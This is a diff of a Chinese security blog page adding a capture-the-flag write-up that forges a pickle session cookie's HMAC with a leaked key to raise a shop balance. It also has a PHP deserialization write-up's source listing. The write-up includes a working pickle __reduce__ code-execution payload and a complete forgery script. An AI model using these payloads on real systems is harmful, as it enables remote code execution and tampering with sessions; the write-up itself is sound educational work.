@@ -3514,6 +3514,197 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-17 17:00:00+00:00">2026-11-17</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../python/" class="md-meta__link">Python</a>, 
+              <a href="./" class="md-meta__link">反序列化</a>, 
+              <a href="../%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="watevrctf-2019-pickle-store"><a class="toclink" href="../../watevrctf2019-pickle-store/">[watevrCTF-2019] Pickle Store — 改完钱还得把签名一起算对</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Python 反序列化 — pickle session + HMAC 签名伪造</p>
+<p><strong>Flag</strong>：<code>CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../watevrctf2019-pickle-store/#_1">题目概述</a></h3>
+<p>一个卖腌黄瓜的商店。<strong>目标很明确：买下那个 $1000 的 Flag Pickle。</strong></p>
+<p><strong>但初始资金不够。</strong>页面顶上显示 <code>Your funds: $998999</code>（这是改成功之后的样子，初始只有 500）。</p>
+<p>于是问题变成：<strong>怎么让服务器相信我有钱。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../watevrctf2019-pickle-store/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../watevrctf2019-pickle-store/#step-1">Step 1：先随便买几个，看看有没有别的反馈</a></h4>
+<p><strong>点了标准腌黄瓜（$10）和 Smörgåsgurka（$100），除了 history 里多两条记录，没有别的反应。</strong></p>
+<p><strong>真正的东西在 cookie 里。</strong></p>
+<h4 id="step-2session-cookie-base64-pickle"><a class="toclink" href="../../watevrctf2019-pickle-store/#step-2session-cookie-base64-pickle">Step 2：session cookie 是 base64 过的 pickle</a></h4>
+<p><strong>抓包看到一个 <code>session</code> cookie，长得像 base64：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>gAN9cQAoWAAAA...（很长）
+</span></code></pre></div>
+<p><strong>base64 解一次，得到的是二进制——而且开头是 <code>\x80\x04\x95</code>，这是 <strong>pickle 的协议头</strong>。</strong></p>
+<p><strong>Python 的 session 直接把字典 pickle 完再 base64 塞进 cookie，等于把内部对象结构交给客户端保存。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../watevrctf2019-pickle-store/#step-3">Step 3：解开看结构</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">session_cookie</span><span class="p">))</span>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>得到一个字典：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">{</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>  <span class="s1">'money'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>  <span class="s1">'history'</span><span class="p">:</span> <span class="p">[</span><span class="s1">'Yummy smörgåsgurka'</span><span class="p">,</span> <span class="s1">'Yummy standard pickle'</span><span class="p">],</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>  <span class="s1">'anti_tamper_hmac'</span><span class="p">:</span> <span class="s1">'29ea7e88282f92f4ffc2976f14905697'</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>三个键：钱、购买记录、还有一个防篡改的 HMAC。</strong></p>
+<h4 id="step-4-money"><a class="toclink" href="../../watevrctf2019-pickle-store/#step-4-money">Step 4：直接改 money —— 失败</a></h4>
+<p><strong>第一反应是 <code>data['money'] = 1000000</code>，重新 pickle + base64，替换 cookie。</strong></p>
+<p><strong>结果页面上钱还是 500。</strong></p>
+<p><strong>原因就是第三个键：<code>anti_tamper_hmac</code>。</strong></p>
+<p><strong>服务端每次收到请求都会</strong>重新算一遍 HMAC<strong>，和你 cookie 里带来的那个比。对不上，就用默认的 <code>money=500</code> 重建 session。</strong></p>
+<p><strong>所以光改值不行，</strong>签名也得跟着对<strong>。</strong></p>
+<h4 id="step-5-pickle"><a class="toclink" href="../../watevrctf2019-pickle-store/#step-5-pickle">Step 5：顺手试一下 pickle 本身能不能执行代码</a></h4>
+<p><strong>pickle 反序列化的经典利用是 <code>__reduce__</code>：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="k">class</span><span class="w"> </span><span class="nc">evil</span><span class="p">:</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>        <span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">"__import__('os').system('sleep 5') or 0"</span><span class="p">,))</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">evil</span><span class="p">(),</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>把 session 换成这个 payload，页面</strong>确实延迟了 5 秒<strong>——说明服务器在反序列化的那一刻就执行了我们的代码。</strong></p>
+<p><strong>接着试了把 <code>ls</code> 的结果写到 <code>static/</code> 目录下，再从浏览器去访问，打不开。</strong>这条路放弃。</p>
+<h4 id="step-6-github"><a class="toclink" href="../../watevrctf2019-pickle-store/#step-6-github">Step 6：去 GitHub 找源码</a></h4>
+<p><strong>作者把源码开源在 GitHub 上。翻到处理 session 的那段：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="n">cookies</span><span class="p">[</span><span class="s2">"anti_tamper_hmac"</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">"session"</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">)))</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="k">return</span> <span class="n">resp</span>
+</span></code></pre></div>
+<p><strong>然后把 key 也找到了：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"58c93becce9a13c96778ded0edd8096d"</span>
+</span></code></pre></div>
+<p><strong>这里要注意两个细节：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>① HMAC 用的是 md5（源码里 hmac.new(key, digestmod=hashlib.md5)）
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>② 参与计算的是 str(cookies)，而且是在**加入 anti_tamper_hmac 之前**的字典
+</span></code></pre></div>
+<p><strong>也就是说：服务端把你 cookie 里的 <code>money</code> 和 <code>history</code> 拼成 Python 字典的字符串形式，再算 HMAC。</strong></p>
+<p><strong>知道 key，我们就能自己算出一个合法的签名。</strong></p>
+<h4 id="step-7"><a class="toclink" href="../../watevrctf2019-pickle-store/#step-7">Step 7：本地构造 + 签名 + 替换</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"58c93becce9a13c96778ded0edd8096d"</span>
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span>
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>
+</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="c1"># 注意顺序：和服务器保持一致，先 money 再 history</span>
+</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"money"</span><span class="p">:</span> <span class="mi">999999</span><span class="p">,</span> <span class="s2">"history"</span><span class="p">:</span> <span class="p">[]}</span>
+</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a>
+</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a><span class="c1"># 算完再把签名塞进去</span>
+</span><span id="__span-37-15"><a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a><span class="n">cookies</span><span class="p">[</span><span class="s2">"anti_tamper_hmac"</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span><span id="__span-37-16"><a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a>
+</span><span id="__span-37-17"><a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p><strong>把这个输出替换掉浏览器的 <code>session</code> cookie，刷新——钱变成了 $998999。</strong></p>
+<p><strong>然后点 Flag Pickle 的 Buy。</strong></p>
+<p><strong>拿到：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>session 格式</td>
+<td><code>base64(pickle.dumps(dict))</code>，客户端持有完整对象</td>
+</tr>
+<tr>
+<td>防篡改</td>
+<td><code>anti_tamper_hmac</code>，服务端每次重算并比对</td>
+</tr>
+<tr>
+<td>参与签名的内容</td>
+<td><code>str(cookies)</code>，且<strong>不包含</strong> <code>anti_tamper_hmac</code> 自身</td>
+</tr>
+<tr>
+<td>字典顺序</td>
+<td>Python 3.7+ 保持插入顺序，<code>str(dict)</code> 的结果依赖它，<strong>必须和服务器一致</strong></td>
+</tr>
+<tr>
+<td>pickle 可执行</td>
+<td><code>__reduce__</code> 能在反序列化时执行任意代码（sleep 5 验证过）</td>
+</tr>
+<tr>
+<td>最终解法</td>
+<td>源码泄露 key → 自己算 HMAC → 改钱不触发重置</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整脚本</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"58c93becce9a13c96778ded0edd8096d"</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span>
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"money"</span><span class="p">:</span> <span class="mi">999999</span><span class="p">,</span> <span class="s2">"history"</span><span class="p">:</span> <span class="p">[]}</span>
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="n">cookies</span><span class="p">[</span><span class="s2">"anti_tamper_hmac"</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a>
+</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 只改 money 不改签名</strong></p>
+<p>服务端会重算 HMAC，对不上就丢弃整个 session，用默认值（money=500）重建。<strong>表现出来就是“我的修改没生效”。</strong></p>
+<p><strong>② 把 <code>anti_tamper_hmac</code> 一起算进签名</strong></p>
+<p>源码里是<strong>先算 HMAC、后插入这个键</strong>。你把带签名的字典再算一遍，结果一定对不上。</p>
+<p><strong>③ 字典顺序变了</strong></p>
+<p><code>str({'history': [], 'money': 999999})</code> 和 <code>str({'money': 999999, 'history': []})</code> 是两个不同的字符串。<strong>键的插入顺序必须和服务器一致。</strong></p>
+<p><strong>④ 以为 pickle RCE 这条路能直接拿 flag</strong></p>
+<p>代码执行确实成立（sleep 5 有效），但 flag 不在磁盘上随便一个位置——它要靠“买”这个业务动作才会显示。<strong>所以还是得回到签名伪造。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-03 20:40:00+00:00">2026-11-03</time></li>
         
           <li class="md-meta__item">
@@ -3548,136 +3739,136 @@
 <hr />
 <h3 id="_2"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_2">解题过程</a></h3>
 <h4 id="step-1-sink"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-1-sink">Step 1：读源码，先找 sink</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="x">function filter($img){</span>
-</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="x">    $filter_arr = array('php','flag','php5','php4','fl1g');</span>
-</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="x">    $filter = '/'.implode('|',$filter_arr).'/i';</span>
-</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a><span class="x">    return preg_replace($filter,'',$img);</span>
-</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a><span class="x">}</span>
-</span><span id="__span-76-6"><a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a>
-</span><span id="__span-76-7"><a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a><span class="x">$_SESSION["user"] = 'guest';</span>
-</span><span id="__span-76-8"><a id="__codelineno-76-8" name="__codelineno-76-8" href="#__codelineno-76-8"></a><span class="x">$_SESSION['function'] = $function;</span>
-</span><span id="__span-76-9"><a id="__codelineno-76-9" name="__codelineno-76-9" href="#__codelineno-76-9"></a><span class="x">extract($_POST);</span>
-</span><span id="__span-76-10"><a id="__codelineno-76-10" name="__codelineno-76-10" href="#__codelineno-76-10"></a>
-</span><span id="__span-76-11"><a id="__codelineno-76-11" name="__codelineno-76-11" href="#__codelineno-76-11"></a><span class="x">if(!$_GET['img_path']){</span>
-</span><span id="__span-76-12"><a id="__codelineno-76-12" name="__codelineno-76-12" href="#__codelineno-76-12"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
-</span><span id="__span-76-13"><a id="__codelineno-76-13" name="__codelineno-76-13" href="#__codelineno-76-13"></a><span class="x">}else{</span>
-</span><span id="__span-76-14"><a id="__codelineno-76-14" name="__codelineno-76-14" href="#__codelineno-76-14"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
-</span><span id="__span-76-15"><a id="__codelineno-76-15" name="__codelineno-76-15" href="#__codelineno-76-15"></a><span class="x">}</span>
-</span><span id="__span-76-16"><a id="__codelineno-76-16" name="__codelineno-76-16" href="#__codelineno-76-16"></a>
-</span><span id="__span-76-17"><a id="__codelineno-76-17" name="__codelineno-76-17" href="#__codelineno-76-17"></a><span class="x">$serialize_info = filter(serialize($_SESSION));</span>
-</span><span id="__span-76-18"><a id="__codelineno-76-18" name="__codelineno-76-18" href="#__codelineno-76-18"></a>
-</span><span id="__span-76-19"><a id="__codelineno-76-19" name="__codelineno-76-19" href="#__codelineno-76-19"></a><span class="x">if($function == 'highlight_file'){</span>
-</span><span id="__span-76-20"><a id="__codelineno-76-20" name="__codelineno-76-20" href="#__codelineno-76-20"></a><span class="x">    highlight_file('index.php');</span>
-</span><span id="__span-76-21"><a id="__codelineno-76-21" name="__codelineno-76-21" href="#__codelineno-76-21"></a><span class="x">}else if($function == 'phpinfo'){</span>
-</span><span id="__span-76-22"><a id="__codelineno-76-22" name="__codelineno-76-22" href="#__codelineno-76-22"></a><span class="x">    eval('phpinfo();');</span>
-</span><span id="__span-76-23"><a id="__codelineno-76-23" name="__codelineno-76-23" href="#__codelineno-76-23"></a><span class="x">}else if($function == 'show_image'){</span>
-</span><span id="__span-76-24"><a id="__codelineno-76-24" name="__codelineno-76-24" href="#__codelineno-76-24"></a><span class="x">    $userinfo = unserialize($serialize_info);</span>
-</span><span id="__span-76-25"><a id="__codelineno-76-25" name="__codelineno-76-25" href="#__codelineno-76-25"></a><span class="x">    echo file_get_contents(base64_decode($userinfo['img']));</span>
-</span><span id="__span-76-26"><a id="__codelineno-76-26" name="__codelineno-76-26" href="#__codelineno-76-26"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="x">function filter($img){</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="x">    $filter_arr = array('php','flag','php5','php4','fl1g');</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="x">    $filter = '/'.implode('|',$filter_arr).'/i';</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="x">    return preg_replace($filter,'',$img);</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="x">}</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="x">$_SESSION["user"] = 'guest';</span>
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="x">$_SESSION['function'] = $function;</span>
+</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="x">extract($_POST);</span>
+</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>
+</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="x">if(!$_GET['img_path']){</span>
+</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
+</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="x">}else{</span>
+</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
+</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="x">}</span>
+</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a>
+</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="x">$serialize_info = filter(serialize($_SESSION));</span>
+</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a>
+</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="x">if($function == 'highlight_file'){</span>
+</span><span id="__span-38-20"><a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a><span class="x">    highlight_file('index.php');</span>
+</span><span id="__span-38-21"><a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a><span class="x">}else if($function == 'phpinfo'){</span>
+</span><span id="__span-38-22"><a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a><span class="x">    eval('phpinfo();');</span>
+</span><span id="__span-38-23"><a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a><span class="x">}else if($function == 'show_image'){</span>
+</span><span id="__span-38-24"><a id="__codelineno-38-24" name="__codelineno-38-24" href="#__codelineno-38-24"></a><span class="x">    $userinfo = unserialize($serialize_info);</span>
+</span><span id="__span-38-25"><a id="__codelineno-38-25" name="__codelineno-38-25" href="#__codelineno-38-25"></a><span class="x">    echo file_get_contents(base64_decode($userinfo['img']));</span>
+</span><span id="__span-38-26"><a id="__codelineno-38-26" name="__codelineno-38-26" href="#__codelineno-38-26"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>能读文件的是 <code>show_image</code> 分支：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="x">$userinfo = unserialize($serialize_info);</span>
-</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="x">echo file_get_contents(base64_decode($userinfo['img']));</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="x">$userinfo = unserialize($serialize_info);</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="x">echo file_get_contents(base64_decode($userinfo['img']));</span>
 </span></code></pre></div>
 <p><strong>所以目标是：让 <code>$userinfo['img']</code> 等于</strong>某个文件路径的 base64<strong>。</strong></p>
 <h4 id="step-2-img"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-2-img">Step 2：为什么不能直接改 img</a></h4>
 <p><strong><code>$_SESSION['img']</code> 在两个分支里都被无条件赋值，而且是在 <code>extract($_POST)</code> <strong>之后</strong>：</strong></p>
